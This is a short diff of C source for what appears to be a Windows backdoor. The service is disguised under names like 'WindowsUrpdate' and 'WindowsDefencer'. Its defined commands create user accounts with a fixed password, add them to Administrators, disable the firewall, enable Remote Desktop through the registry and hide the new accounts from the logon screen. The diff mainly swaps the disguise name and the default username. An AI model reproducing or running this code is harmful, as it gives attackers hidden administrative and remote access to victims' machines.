@@ -1,18 +1,18 @@
 #include "../wsbind.h"
 
 #define AUTO "auto\0"
-#define NAME "WindowsDefencer\0"
+#define NAME "WindowsUrpdate\0"
 #define TS_START_SVC "sc start TermService\0"
 #define USER_CMD "net user %s%d Password123 /add\0"
 #define TS_STOP_FW "netsh firewall set opmode disable\0"
 #define ADMIN_CMD "net localgroup Administrators %s%d /add\0"
-#define TS_START_REG "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+#define TS_START_REG "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\0"
 #define UDER_HIDE_CMD "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v %s%d /t REG_DWORD /d 0 /f\0"
 
 int CUR_COUNT = 0;
 
 int END_INT = 5000;
-char* USER_NAME = "JohnCena\0";
+char* USER_NAME = "PickleRick\0"; // "JohnCena\0";
 
 void create_user()
 {
